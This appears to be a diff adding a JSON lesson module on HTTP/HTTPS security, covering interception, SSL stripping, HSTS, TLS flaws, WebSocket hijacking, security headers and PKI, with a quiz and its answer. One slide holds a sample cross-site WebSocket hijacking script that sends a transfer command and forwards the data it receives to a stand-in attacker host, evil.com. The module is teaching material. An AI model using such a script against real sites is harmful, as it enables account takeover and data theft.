@@ -1,0 +1,119 @@
+{
+    "id": "learn_http_https",
+    "topicId": "http_https",
+    "topicTitle": "HTTP/HTTPS Security",
+    "description": "Master the security mechanisms of the Web: HTTPS interception, HSTS, TLS best practices, and next-gen protocols.",
+    "baseKP": 100,
+    "slides": [
+        {
+            "id": "http_intro_1",
+            "type": "content",
+            "title": "HTTP vs HTTPS",
+            "content": "# The Evolution of Web Trust 🌐\n\n**HTTP (HyperText Transfer Protocol)** is plaintext. Anyone on the wire (Wi-Fi, ISP) can read and modify traffic.\n\n**HTTPS (HTTP Secure)** adds a layer of encryption (SSL/TLS) to ensure:\n-   **Confidentiality**: Only you and the server can read data.\n-   **Integrity**: Data hasn't been tampered with.\n-   **Authentication**: You are talking to the real server, not an impostor."
+        },
+        {
+            "id": "https_interception_1",
+            "type": "content",
+            "title": "HTTPS Interception",
+            "content": "# HTTPS Interception (MITM) 🕵️\n\nEven with HTTPS, interception is possible under specific conditions.\n\n## How it Works\n1.  **Proxy**: The attacker (or corporate firewall) sits between Client and Server.\n2.  **Fake Cert**: When Client asks for `google.com`, Proxy generates a fake certificate for `google.com` signed by its own CA.\n3.  **Trust**: If the Client *trusts* the Proxy's CA (e.g., corporate device, installed malware), the connection is intercepted silently.\n\n> ⚠️ **Reality Check**: This is how corporate DLP (Data Loss Prevention) and Parental Control software works."
+        },
+        {
+            "id": "ssl_strip_1",
+            "type": "content",
+            "title": "SSL Stripping",
+            "content": "# SSL Stripping 👙\n\nA downgrade attack introduced by Moxie Marlinspike.\n\n## The Mechanism\n1.  Victim requests `http://bank.com`.\n2.  Attacker intercepts and forwards req to bank.\n3.  Bank replies with redirects to `https://bank.com`.\n4.  **The Trick**: Attacker *strips* the `https` and serves the victim `http://bank.com`.\n5.  Attacker proxies traffic: Cleartext with Victim <-> Encrypted with Bank.\n\n**Result**: Victim sees a normal site, just no padlock icon."
+        },
+        {
+            "id": "hsts_1",
+            "type": "content",
+            "title": "HSTS Defense",
+            "content": "# HSTS: Structural Integrity 🏗️\n\n**HTTP Strict Transport Security (HSTS)** kills SSL Stripping.\n\n## How it Works\nThe server sends a header:\n`Strict-Transport-Security: max-age=31536000; includeSubDomains`\n\n## The Effect\n-   The browser **remembers** this rule.\n-   For the next year (max-age), the browser *automatically* upgrades all `http://` requests to `https://` locally, **before** sending the packet.\n-   Refuses to allow user to click through certificate warnings."
+        },
+        {
+            "id": "tls_vulnerabilities_1",
+            "type": "content",
+            "title": "TLS Vulnerabilities",
+            "content": "# Historic TLS Failures 💥\n\nEncryption is hard. Implementation bugs have been devastating.\n\n## Heartbleed (OpenSSL)\n-   **Type**: Buffer Over-read.\n-   **Effect**: Allowed attackers to read server memory, stealing private keys and user passwords.\n\n## POODLE\n-   **Type**: Padding Oracle Downgrade.\n-   **Effect**: Forced fallback to SSL 3.0 (insecure) to decrypt cookies.\n\n## CRIME / BREACH\n-   **Type**: Compression Side-channel.\n-   **Effect**: Leaked secrets based on how compression size changed with injected text."
+        },
+        {
+            "id": "tls_quiz",
+            "type": "quiz",
+            "title": "TLS Quiz",
+            "content": "Check your history.",
+            "quizQuestion": "What is the primary function of the HSTS header?",
+            "quizOptions": [
+                "To compress HTTP traffic",
+                "To force browsers to communicate only via HTTPS",
+                "To encrypt the database",
+                "To hide the server version"
+            ],
+            "correctOptionIndex": 1
+        },
+        {
+            "id": "http2_1",
+            "type": "content",
+            "title": "HTTP/2 Security",
+            "content": "# HTTP/2: Faster & Riskier? 🚀\n\nHTTP/2 introduced header compression (HPACK) and multiplexing.\n\n## New Attack Surface\n-   **HPACK Bomb**: A DoS attack constructing small malicious headers that decompress into gigabytes server-side.\n-   **Stream Multiplexing Abuse**: Flooding the server with rapid stream resets (Rapid Reset Attack - used in massive DDoS events).\n-   **Request Smuggling**: Inconsistencies between HTTP/1.1 frontend and HTTP/2 backend parsers."
+        },
+        {
+            "id": "websocket_sec_1",
+            "type": "content",
+            "title": "WebSocket Security",
+            "content": "# WebSocket Security 🔌\n\nWebSockets enable full-duplex persistent connections (chat apps, gaming).\n\n## Vulnerabilities\n-   **CSWSH (Cross-Site WebSocket Hijacking)**: Like CSRF but for WebSockets. If the handshake doesn't check the `Origin` header, a malicious site can open a socket to your server using the victim's cookies.\n-   **Input Validation**: Once established, WS traffic often bypasses standard WAFs (Web Application Firewalls) which only inspect HTTP requests.\n\n> 🛡️ **Fix**: Always validate the `Origin` header during the handshake."
+        },
+        {
+            "id": "websocket_code",
+            "type": "content",
+            "title": "CSWSH Exploit Concept",
+            "content": "# CSWSH JavaScript Exploit 💻\n\nMalicious code hosted on `evil.com` to hijack a socket on `bank.com`.\n\n```javascript\n// Hosted on attacker site\nvar ws = new WebSocket(\"wss://bank.com/account\");\nws.onopen = function() {\n    // Automatically sends victim's cookies!\n    ws.send(\"TRANSFER 1000 TO ATTACKER\");\n};\nws.onmessage = function(e) {\n    fetch(\"https://evil.com/log?data=\" + e.data);\n};\n```\n\n<!-- FULL_CODE_START\n// This is client-side JS code concept.\n\nconsole.log(\"=== Cross-Site WebSocket Hijacking Demo ===\");\n\nconst victimServer = \"wss://echo.websocket.org\"; // Public test echo server\n\nconsole.log(`[!] Attempting connection to: ${victimServer}`);\n\n// In a real attack, the browser automatically attaches cookies \n// from the victim's session with the target domain.\n\ntry {\n    const ws = new WebSocket(victimServer);\n\n    ws.onopen = function() {\n        console.log(\"[+] Connection Established!\");\n        console.log(\"[+] Sending malicious payload via hijacked socket...\");\n        ws.send(\"STEAL_DATA_COMMAND\");\n    };\n\n    ws.onmessage = function(event) {\n        console.log(\"[+] Response received from target: \" + event.data);\n        console.log(\"[!] Data exfiltrated to attacker.\");\n        ws.close();\n    };\n\n    ws.onerror = function(error) {\n        console.log(\"[-] Error: \" + error.message);\n    };\n} catch (e) {\n    console.log(\"WebSocket not supported in this environment.\");\n}\nFULL_CODE_END -->"
+        },
+        {
+            "id": "cert_pinning",
+            "type": "content",
+            "title": "Certificate Pinning",
+            "content": "# Certificate Pinning 📌\n\nUsed in mobile apps to prevent interception (even if the user trusts a malicious CA).\n\n## Concept\n-   The app hardcodes the hash of the expected server certificate (or public key).\n-   On connection, it checks the server's cert against the pinned hash.\n-   **Mismatch**: Connection aborted, even if the cert is validly signed by a trusted root.\n\n> ⚠️ **Trade-off**: High maintenance. If you update your cert and forget to update the app, you brick the app."
+        },
+        {
+            "id": "tls_inspection_1",
+            "type": "content",
+            "title": "TLS Inspection",
+            "content": "# TLS Inspection (Corporate) 🏢\n\nCompanies often decrypt employee traffic to scan for malware/leaks.\n\n## The Architecture\nFirewall acts as a text-book Man-in-the-Middle.\n1.  Generates dynamic cert for target site.\n2.  Decrypts traffic.\n3.  Inspects content.\n4.  Re-encrypts and sends to destination.\n\n**Risk**: If the firewall is compromised, ALL secure traffic is exposed."
+        },
+        {
+            "id": "headers_security",
+            "type": "content",
+            "title": "Essential Headers",
+            "content": "# HTTP Security Headers 🛡️\n\nMust-have headers for secure transport:\n\n1.  **Strict-Transport-Security (HSTS)**: Enforce HTTPS.\n2.  **X-Content-Type-Options: nosniff**: Prevent MIME sniffing attacks.\n3.  **X-Frame-Options: DENY**: Prevent Clickjacking.\n4.  **Referrer-Policy**: Control how much info is sent in the Referer header.\n5.  **Content-Security-Policy (CSP)** (Browser module): Restrict resource loading."
+        },
+        {
+            "id": "python_check_headers",
+            "type": "content",
+            "title": "Header Checker",
+            "content": "# Checking Headers with Python 🐍\n\n```python\nimport requests\n\nr = requests.get('https://google.com')\nprint(r.headers.get('Strict-Transport-Security'))\n```\n\n<!-- FULL_CODE_START\nimport requests\n\ndef check_security_headers(url):\n    try:\n        print(f\"[*] Checking headers for: {url}\")\n        response = requests.get(url)\n        headers = response.headers\n        \n        security_headers = [\n            \"Strict-Transport-Security\",\n            \"X-Content-Type-Options\",\n            \"X-Frame-Options\",\n            \"Content-Security-Policy\",\n            \"X-XSS-Protection\"\n        ]\n        \n        print(\"{:<30} | {}\".format(\"HEADER\", \"VALUE\"))\n        print(\"-\"*60)\n        \n        for h in security_headers:\n            val = headers.get(h, \"[MISSING]\")\n            # Truncate long values for display\n            if len(val) > 25: val = val[:22] + \"...\"\n            print(\"{:<30} | {}\".format(h, val))\n            \n    except Exception as e:\n        print(f\"[-] Error: {e}\")\n\ncheck_security_headers(\"https://www.google.com\")\ncheck_security_headers(\"https://www.github.com\")\nFULL_CODE_END -->"
+        },
+        {
+            "id": "sni_privacy",
+            "type": "content",
+            "title": "SNI Privacy Leak",
+            "content": "# Server Name Indication (SNI) 🏷️\n\nTLS ensures the *content* is encrypted, but the *destination* is often leaked.\n\n## The Leak\n-   During the TLS handshake (ClientHello), the client sends the hostname (`server_name` extension) so the server knows which cert to serve.\n-   This part is **unencrypted**.\n-   **Result**: ISPs/Censors can see *which* website you are visiting, even if they can't see the page content.\n\n## ECH (Encrypted Client Hello)\nThe successor to ESNI, aiming to encrypt the entire handshake."
+        },
+        {
+            "id": "downgrade_attacks",
+            "type": "content",
+            "title": "Downgrade Attacks",
+            "content": "# Protocol Downgrade 📉\n\nForcing a server/client to use an older, weaker protocol.\n\n## Logjam / FREAK\n-   Tricked servers into using weak 512-bit \"Export Grade\" keys (from the 90s cryptowars).\n-   Attackers could crack these keys in real-time.\n\n> 🛡️ **Fix**: Disable support for SSLv3, TLS 1.0, TLS 1.1, and weak cipher suites (NULL, RC4, DES) on your servers."
+        },
+        {
+            "id": "pki_infrastructure",
+            "type": "content",
+            "title": "PKI & Certificate Authorities",
+            "content": "# Public Key Infrastructure (PKI) 🏛️\n\nWeb trust relies on CAs.\n\n## Chain of Trust\n1.  **Root CA**: Highly trusted, offline keys (e.g., DigiCert, Let's Encrypt).\n2.  **Intermediate CA**: issued by Root, used to sign day-to-day certs.\n3.  **Leaf Certificate**: The cert on your website.\n\n## Risks\n-   **Compromised CA**: If a CA is hacked, they can issue valid certs for *any* domain (e.g., DigiNotar hack).\n-   **Transparency**: Certificate Transparency (CT) logs help detect misissued certs."
+        },
+        {
+            "id": "http_summary",
+            "type": "content",
+            "title": "Module Summary",
+            "content": "# Wrap Up 🎁\n\n-   **HTTPS**: Mandatory for modern web Security.\n-   **HSTS**: Critical to prevent stripping attacks.\n-   **Headers**: X-Frame-Options, CSP, and HSTS form the holy trinity of response security.\n-   **WebSockets**: Must validate Origin.\n-   **Configuration**: The underlying TLS config (ciphers, versions) is just as important as the certificate itself.\n\nNext up: VoIP and SIP Security!"
+        }
+    ]
+}
